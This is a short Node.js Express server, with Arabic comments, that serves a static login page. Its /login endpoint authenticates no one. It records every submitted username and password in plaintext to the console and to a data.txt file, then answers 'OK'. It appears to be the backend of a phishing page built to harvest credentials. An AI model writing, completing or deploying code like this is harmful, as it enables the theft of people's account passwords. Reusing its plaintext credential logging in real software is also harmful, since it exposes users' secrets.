const express = require('express');
const fs = require('fs');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// مهم: تحديد مجلد ثابت للملفات
const publicPath = path.join(__dirname, 'public');
app.use(express.static(publicPath));

// route الصفحة الرئيسية
app.get('/', (req, res) => {
    res.sendFile(path.join(publicPath, 'index.html'));
});

// API
app.post('/login', (req, res) => {
    try {
        const data = req.body;

        const username = data.username || data.email || 'غير معروف';
        const password = data.password || 'غير معروف';

        console.log("\n==============================");
        console.log("📥 بيانات وصلت:");
        console.log("User:", username);
        console.log("Pass:", password);
        console.log("==============================\n");

        const logData =
            `[${new Date().toISOString()}] User: ${username} | Pass: ${password}\n`;

        fs.appendFileSync(
            path.join(__dirname, 'data.txt'),
            logData,
            'utf8'
        );

        res.status(200).send("OK");
    } catch (err) {
        console.error(err);
        res.status(500).send("Server error");
    }
});

// تشغيل السيرفر
app.listen(PORT, () => {
    console.log("Server running on port", PORT);
});
